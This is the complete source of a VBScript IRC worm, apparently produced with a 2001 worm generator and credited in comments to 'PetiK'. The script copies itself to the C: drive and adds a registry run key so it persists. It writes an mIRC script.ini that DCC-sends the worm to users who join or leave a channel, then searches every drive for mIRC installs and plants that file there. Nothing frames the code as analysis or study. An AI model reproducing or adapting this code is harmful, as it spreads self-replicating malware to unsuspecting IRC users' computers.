   on error resume next
   Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder , w ,w1
   dim vcr2
   Set fso = CreateObject( "Scripting.FileSystemObject" )
   Set Shell = Wscript.CreateObject("Wscript.Shell")
   Set w = fso.GetFile(WScript.ScriptFullName)
   w.Copy ("C:\emm.txt.vbs")
   Set vrc2 = CreateObject( "WScript.Shell" )
   vrc2.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & "EMM", ("C:\emm.txt.vbs")
   Set Script = Fso.CreateTextFile("\script.ini", True)
   Script.Writeline "[script]"
   Script.Writeline "n0=;Coded by LittleBoy worm Generator 2001 / acidcookie / www.vxbiolabs.cjb.net"
   Script.Writeline "n1=On 1:JOIN:#:{ /if ( $nick==me ) { halt } "
   Script.Writeline "n2= /dcc send $nick " & fso.GetSpecialFolder(0) & "\emm.txt.vbs"
   Script.Writeline "n3= }"
   Script.Writeline "n4=on 1:PART:#:{ /if ( $nick==me ) {halt}"
   Script.writeline "n5= /dcc send $nick " & fso.GetSpecialFolder(0) & "\emm.txt.vbs"
   Script.Writeline "n6=}"
   Script.Close
   Set w1 = fso.GetFile("\script.ini")
   w1.copy ("C:\mirc\script.ini")
   w1.copy ("C:\program files\script.ini")
   Set Drives=fso.drives
   For Each Drive in Drives
   If drive.isready then
   Dosearch drive
   end If
   Next

   Function Dosearch(Path)
   Set Folder=fso.getfolder(path)
   Set Files = folder.files
   For Each File in files

   If file.name = "mirc.ini" then

   w1.copy (folder.path & "\script.ini")
   end If
   Next

   Set Subfolders = folder.SubFolders
   For Each Subfolder in Subfolders
   Dosearch Subfolder.path
   Next
   end function
   'Author name is: PetiK
   'This worm is created by Little Boy VBS-Worm Generator/2001/ Acidcookie  / www.vxbiolabs.cjb.net
